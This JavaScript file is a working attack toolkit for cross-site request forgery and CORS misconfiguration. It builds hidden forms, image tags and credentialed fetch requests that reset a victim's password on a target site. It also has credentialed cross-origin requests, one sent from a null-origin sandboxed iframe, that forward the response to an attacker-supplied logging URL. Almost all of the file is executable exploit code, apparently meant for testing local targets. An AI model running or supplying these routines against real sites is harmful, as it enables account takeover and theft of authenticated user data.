/*
Methods which can be used in CSRF Attacks

1) fetch
2) Form
3) img_src=
4) img_src=_method


StartCSRFAttack()
StartCORSAttack()

*/
function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}





function FetchRequests(url, type){
	/* Same-Site: None  */
	switch (type) {
		case "GET":
			console.log("[*] Send GET request to " + url );
			fetch(url + "?" + new URLSearchParams({"password": "N3w_F3tch_passw0rd_t0_SidneyJob!",}), {credentials: "include"})
			return 0;
	
		case "POST":
			console.log("[*] Send POST request to " + url );
			fetch(url, {
                method: "POST", 
                body: "password=N3w_F3tch_passw0rd_t0_SidneyJob!",
                credentials: "include",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            });
			return 0;

		default:
			console.error("[-] Method Not Allowed");
			return -1;
		}
}

function CreateCSRFForm(url, type){
    var url = url + "/reset_password"
    var form = document.createElement("form");
    form.setAttribute("method", type);
    form.setAttribute("action", url);

    var s = document.createElement("input");
    s.setAttribute("type", "submit");
    s.setAttribute("value", "SEND " + type + " REQUEST");

    var data = document.createElement("input");
    data.setAttribute("type", "hidden");
    data.setAttribute("name", "password");
    data.setAttribute("value", "N3w_passw0rd_t0_SidneyJob!");

    form.appendChild(s);
    form.appendChild(data);
    document.getElementsByTagName("body")[0].appendChild(form);

    return 1;
}

function CreateCSRFImg(url){
    var url = url + "/reset_password?password=N3w_passw0rd_t0_SidneyJob!";
    var img = document.createElement("img");
    img.setAttribute("src", url);

    document.getElementsByTagName("body")[0].appendChild(img);

    return 1;
}






function CreateCORSForm(url, type, logurl, page){
    var url = url + "/" + page
    var div = document.createElement("div");

    var input = document.createElement("input");
    input.setAttribute("id", type+page+'Button');
    input.setAttribute("type", "checkbox");

    var label = document.createElement("label");
    label.innerHTML = "Send " + type + " request to " + page

    div.appendChild(input);
    div.appendChild(label);

    document.getElementsByTagName("body")[0].appendChild(div);

    button = document.querySelector('#'+type+page+'Button');
    button.addEventListener('click', CorsReq, false);
    
    button.url = url;
    button.logurl = logurl;
    button.reqtype = type;

    return 1;
}

function CorsReq(evt){
    var url = evt.currentTarget.url;
    var type = evt.currentTarget.reqtype;
    var logurl = evt.currentTarget.logurl;
    alert(url, type, logurl);

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open(type, url, true);

    req.withCredentials = true;
    req.send();

    function reqListener() {
        location=logurl+'?key='+this.responseText;
    };
}




function CorsNullReq(url, type, logurl, page){
    function innerIframe(evt){
        var url = evt.currentTarget.url;
        var type = evt.currentTarget.reqtype;
        var logurl = evt.currentTarget.logurl;
        var page = evt.currentTarget.page;
        console.log(url);
        var elem = document.querySelector('#'+type+page+'ButtonNullP');
        elem.innerHTML = `
            <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('${type}','${url}',true);
            req.withCredentials = true;
            req.send();

            function reqListener() { 
                location='${logurl}?key='+this.responseText;
            };
            </script>">
            </iframe>`;

    } 
    var url = url + "/" + page
    
    var div = document.createElement("div");
    div.setAttribute("id", "iframediv_"+page)

    var input = document.createElement("input");
    input.setAttribute("id", type+page+'ButtonNull');
    input.setAttribute("type", "checkbox");

    var label = document.createElement("label");
    label.innerHTML = "Send " + type + " request to " + page + "[NULL]"

    var p = document.createElement("p")
    p.setAttribute("id", type+page+'ButtonNullP');


    div.appendChild(input);
    div.appendChild(label);
    div.appendChild(p);

    document.getElementsByTagName("body")[0].appendChild(div);

    button = document.querySelector('#'+type+page+'ButtonNull');
    button.addEventListener('click', innerIframe, false);
    
    button.url = url;
    button.logurl = logurl;
    button.reqtype = type;
    button.page = page;
}

function StartCORSAttack(url, logurl){
    var types = ["GET", "POST"];
    var pages = ["api_correct", "api_null", "api_gen", "api_without_creds"]

    for (let i = 0; i < types.length; i += 1) {
        for (let j = 0; j < pages.length; j += 1) {
            if(CreateCORSForm(url, types[i], logurl, pages[j])){
                console.log("Successfully created CORS forms!");
            };
            if(CorsNullReq(url, types[i], logurl, pages[j])){
                console.log("Successfully created CORS NULL iframes")
            }   
    
    }
}
}

function StartCSRFAttack(url){
    var types = ["GET", "POST"];
    // Example URL: https://site.ru
    // Ex start this function: StartCSRFAttack('https://127.0.0.1:8081');

    for (let i = 0; i < types.length; i += 1) {
      if(CreateCSRFForm(url, types[i])){
        console.log("Successfully created [" + types[i] + "] form!");
        };
    }

    // if(CreateCSRFImg(url)){
    //     console.log("Successfully created image!");
    // };
    for (let i = 0; i < types.length; i += 1) {
        if(FetchRequests(url+"/reset_password", types[i])){
            console.log('Successfully sent ' + types[i] + ' request to ' + url)
        }
    }
}
